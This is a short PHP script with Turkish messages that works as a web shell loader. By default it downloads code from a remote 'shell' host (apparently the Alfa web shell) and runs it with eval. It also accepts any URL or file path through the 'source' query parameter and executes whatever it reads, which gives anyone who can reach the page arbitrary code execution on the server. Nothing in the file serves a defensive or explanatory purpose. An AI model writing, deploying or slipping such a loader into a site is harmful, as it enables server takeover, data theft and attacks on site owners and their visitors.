<?php
$defaultUrl = 'https://shell.prinsh.com/Nathan/alfa.txt';
$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
$fileContent = '';
if (filter_var($input, FILTER_VALIDATE_URL)) {
    $fileContent = file_get_contents($input);
} else {
    $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($input, '/');
    if (file_exists($filePath)) {
        $fileContent = file_get_contents($filePath);
    } else {
        echo "Dosya bulunamadı: " . htmlspecialchars($filePath);
        exit;
    }
}
if ($fileContent !== false) {
    eval('?>' . $fileContent);
} else {
    echo "Dosya içeriği alınamadı.";
}
?>
